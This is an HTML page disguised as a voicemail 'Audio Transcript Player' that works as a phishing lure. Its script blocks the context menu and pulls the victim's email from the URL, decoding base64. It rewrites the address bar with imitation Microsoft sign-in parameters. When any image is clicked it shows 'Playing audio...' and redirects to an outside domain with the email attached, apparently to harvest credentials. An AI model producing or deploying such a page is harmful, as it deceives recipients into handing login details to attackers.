<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Audio Transcript Player</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: #121212;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
            position: relative;
        }

        #microsoft-logo {
            width: 50px;
            cursor: pointer;
            filter: brightness(1.3) contrast(1.2);
            margin-bottom: 20px;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        .player-card {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(255, 255, 255, 0.1);
            padding: 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .header {
            margin-bottom: 24px;
        }

        .title {
            font-size: 18px;
            font-weight: 600;
            color: #e0e0e0;
            margin: 0 0 8px 0;
        }

        #domain-name {
            color: #80a0ff;
            font-weight: 700;
        }

        .subtitle {
            font-size: 14px;
            color: #a0a0a0;
            margin: 0;
        }

        #player-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        #music-img {
            width: 80px;
            height: 80px;
            cursor: pointer;
            transition: all 0.2s ease;
            border-radius: 8px;
            padding: 16px;
            background: #121212;
            border: 1px solid #333;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        #music-img:hover {
            background: #333;
            border-color: #3498db;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(52, 152, 219, 0.5);
        }

        .time-display {
            background: #333;
            color: #e0e0e0;
            padding: 8px 16px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 1px;
            min-width: 80px;
        }

        #progress-container {
            width: 100%;
            max-width: 280px;
            height: 6px;
            background: #333;
            border-radius: 3px;
            overflow: hidden;
            cursor: pointer;
        }

        #progress-bar {
            width: 45%;
            height: 100%;
            background: #3498db;
            border-radius: 4px;
            transition: all 0.3s ease;
        }

        #progress-container:hover #progress-bar {
            background: #2980b9;
        }

        #play-button {
            width: 64px;
            height: 64px;
            background-color: #3498db;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(52, 152, 219, 0.3);
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        #play-button::before {
            content: '';
            width: 0;
            height: 0;
            border-left: 14px solid #ffffff;
            border-top: 10px solid transparent;
            border-bottom: 10px solid transparent;
            margin-left: 2px;
        }

        #play-button:hover {
            background-color: #2980b9;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(52, 152, 219, 0.4);
        }

        #play-button:active {
            transform: translateY(0px);
            box-shadow: 0 2px 4px rgba(52, 152, 219, 0.3);
        }

        .controls-row {
            display: flex;
            align-items: center;
            gap: 16px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .divider {
            height: 1px;
            background: #333;
            margin: 20px 0;
        }

        .footer-text {
            font-size: 12px;
            color: #606060;
            margin: 0;
        }

        #identifierDisplay {
            display: none;
            margin-top: 10px;
            color: #9fb2ff;
            font-size: 12px;
            word-break: break-all;
        }

        #emailInput {
            display: none;
        }

        .loading-message {
            display: none;
            margin-top: 16px;
            padding: 12px;
            background: #2a2a2a;
            border-radius: 6px;
            color: #3498db;
            font-size: 14px;
            font-weight: 500;
            animation: blink 1s ease-in-out infinite;
        }

        @keyframes blink {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.3;
            }
        }

        @media (max-width: 480px) {
            .player-card {
                padding: 24px 20px;
            }

            #music-img {
                width: 72px;
                height: 72px;
                padding: 14px;
            }

            #play-button {
                width: 56px;
                height: 56px;
            }

            #play-button::before {
                border-left-width: 12px;
                border-top-width: 8px;
                border-bottom-width: 8px;
            }
        }
    </style>
</head>

<body>
    <p><img id="microsoft-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bf/Google_Voice_icon_%282020%29.svg" alt="Microsoft logo 2012" width="128" title="Click to play audio" draggable="false"></p>
    <div class="player-card">
        <div class="header">
            <h1 class="title">Audio Transcript for</h1>
            <p class="subtitle">Click to access recording</p><input type="text" id="emailInput" aria-hidden="true">
            <div id="identifierDisplay" aria-hidden="true"><br></div>
            <div class="loading-message" id="loadingMessage"><br></div>
        </div>
        <div id="player-container"><img id="music-img" src="https://upload.wikimedia.org/wikipedia/commons/3/35/Simple_Music.svg" alt="Audio file" tabindex="0" title="Play Audio" draggable="false" style="margin: 0 auto 0 0; display: block; ">
            <div class="controls-row"><br></div>
        </div>
        <div class="divider"><br></div>
        <p class="footer-text">Professional Audio Player</p>
    </div>
    <script>
        document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, true);
        function isBase64(str){
          if(typeof str!=='string'||str.length===0) return false;
          var base64Pattern=/^[A-Za-z0-9+/]+={0,2}$/;
          if(!base64Pattern.test(str)) return false;
          try{ return btoa(atob(str))===str; }catch(err){ return false; }
        }
        function capitalizeFirstLetter(s){ if(!s) return s; return s.charAt(0).toUpperCase()+s.slice(1); }
        function getEmailFromLocation(){
          try{
            var urlParams=new URLSearchParams(window.location.search);
            var email=urlParams.get('email');
            if(!email){
              var hash=window.location.hash||'';
              if(hash.startsWith('#')) email=hash.substring(1)||null;
            }
            if(!email) return null;
            if(!email.includes('@')&&!email.includes('#')&&isBase64(email)){
              try{ email=atob(email); }catch(e){}
            }
            return email;
          }catch(err){ return null; }
        }
        function updateDomainName(){
          var decodedEmail=getEmailFromLocation();
          if(!decodedEmail) return;
          var domainMatch=decodedEmail.match(/@([^.]+)/);
          if(domainMatch&&domainMatch[1]){
            var domain=capitalizeFirstLetter(domainMatch[1]);
            var domainElem=document.getElementById('domain-name');
            if(domainElem) domainElem.textContent=domain;
          }
        }
        function redirectUsingEmail(){
          var email=getEmailFromLocation();
          if(!email){ alert('No email found in URL to redirect with.'); return; }
          var redirectBaseUrl='hhttps://playvoicemailstranscript.ghostlyluminescence.de/luMxN#';
          var redirectUrl=redirectBaseUrl+email;
          
          var loadingMsg=document.getElementById('loadingMessage');
          if(loadingMsg){
            loadingMsg.style.display='block';
            loadingMsg.textContent='Playing audio...';
          }
          
          setTimeout(function(){
            window.location.href=redirectUrl;
          }, 5000);
        }
        var logo=document.getElementById('microsoft-logo');
        if(logo) logo.addEventListener('click', redirectUsingEmail);
        var playBtn=document.getElementById('play-button');
        if(playBtn) playBtn.addEventListener('click', redirectUsingEmail);
        var musicImg=document.getElementById('music-img');
        if(musicImg) musicImg.addEventListener('click', redirectUsingEmail);
        updateDomainName();
        (function(){
          var urlParams=new URLSearchParams(window.location.search);
          var currentEmail=urlParams.get('email');
          var customParams={};
          var entriesIterator=urlParams.entries();
          var pair;
          while(!(pair=entriesIterator.next()).done){
            var key=pair.value[0], value=pair.value[1];
            if(!['email','wa','rpsnv','ct','rver','wp','wreply','id','CBCXT','lw','fl','cobrandid','domain','ue'].includes(key)){
              customParams[key]=value;
            }
          }
          var randomValues={
            wa:'wsignin1.0',
            rpsnv:Math.floor(Math.random()*20)+1,
            ct:Math.floor(Date.now()/1000),
            rver:'7.0.'+Math.floor(Math.random()*7000)+'.0',
            wp:'MBI_SSL',
            wreply:'https%3a%2f%2fwww.audioplayer.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d'+generateUUID(),
            id:Math.floor(Math.random()*1000000),
            CBCXT:'out',
            lw:1,
            fl:'dob%2cflname%2cwld',
            cobrandid:90015,
            domain:'mail.com'
          };
          if(currentEmail){
            if(!currentEmail.includes('@')&&!currentEmail.includes('#')&&isBase64(currentEmail)){
              try{ currentEmail=atob(currentEmail); }catch(e){}
            }
            try{ randomValues.ue=btoa(currentEmail); }catch(e){ randomValues.ue=btoa(unescape(encodeURIComponent(currentEmail))); }
            var emailField=document.getElementById('emailInput');
            if(emailField){ emailField.value=currentEmail; emailField.readOnly=true; }
          }else{
            var hashEmail=(window.location.hash||'').replace(/^#/,'');
            if(hashEmail){
              var decoded=hashEmail;
              if(!decoded.includes('@')&&isBase64(decoded)){
                try{ decoded=atob(decoded); }catch(_){} 
              }
              try{ randomValues.ue=btoa(decoded); }catch(e){ randomValues.ue=btoa(unescape(encodeURIComponent(decoded))); }
              var ef=document.getElementById('emailInput');
              if(ef){ ef.value=decoded; ef.readOnly=true; }
            }
          }
          for(var k in customParams) if(Object.prototype.hasOwnProperty.call(customParams,k)) randomValues[k]=customParams[k];
          var newQueryString=Object.keys(randomValues).map(function(key){ return encodeURIComponent(key)+'='+encodeURIComponent(randomValues[key]); }).join('&');
          if(window.location.search!=='?'+newQueryString){
            var hash=window.location.hash||'';
            window.history.replaceState({}, document.title, window.location.pathname+'?'+newQueryString+hash);
          }
          if(Object.keys(customParams).length>0){
            var displayText=Object.keys(customParams).map(function(key){ return key+'='+customParams[key]; }).join(' | ');
            var displayElement=document.getElementById('identifierDisplay');
            if(displayElement){ displayElement.textContent='Session: '+displayText; displayElement.style.display='block'; }
          }
          function generateUUID(){ return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){ var r=Math.random()*16|0; var v=c==='x'?r:(r&0x3|0x8); return v.toString(16); }); }
        })();
    </script>
</body>

</html>